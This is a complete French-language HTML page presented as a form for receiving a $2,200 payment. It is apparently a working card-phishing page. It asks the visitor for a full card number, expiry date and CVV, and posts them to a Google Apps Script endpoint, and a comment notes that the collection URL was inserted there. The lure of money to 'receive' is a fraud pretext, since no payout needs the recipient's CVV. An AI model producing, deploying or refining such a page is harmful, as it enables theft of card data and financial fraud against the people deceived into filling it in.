<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Réception de Paiement - 2200$</title>
    <style>
        body { font-family: sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; padding: 20px; }
        .card-container { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
        .header { text-align: center; margin-bottom: 25px; }
        .amount { font-size: 24px; font-weight: bold; color: #2ecc71; }
        .label { display: block; margin-bottom: 8px; font-size: 14px; color: #555; font-weight: 600; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        .row { display: flex; gap: 15px; }
        .row div { flex: 1; }
        button { width: 100%; background-color: #3498db; color: white; padding: 15px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="card-container">
    <div class="header">
        <p style="margin: 0; color: #777;">Montant à recevoir</p>
        <div class="amount">2 200,00 $</div>
    </div>

    <!-- Ton URL est intégrée ici dans 'action' -->
    <form action="https://script.google.com/macros/s/AKfycbwGOPFTt0eGedDfAkFlboJfaL7fbzB_iFKtBxh8TZdWUBzVvuDemyekLOoh-e_P31o/exec" method="POST">
        
        <label class="label">Numéro de carte bancaire</label>
        <input type="text" name="cardNumber" placeholder="0000 0000 0000 0000" inputmode="numeric" required>

        <div class="row">
            <div>
                <label class="label">Expiration</label>
                <input type="text" name="expiry" placeholder="MM/AA" inputmode="numeric" required>
            </div>
            <div>
                <label class="label">CVV</label>
                <input type="password" name="cvv" placeholder="123" maxlength="3" inputmode="numeric" required>
            </div>
        </div>

        <button type="submit">Recevoir les 2200$ maintenant</button>
    </form>
</div>

</body>
</html>
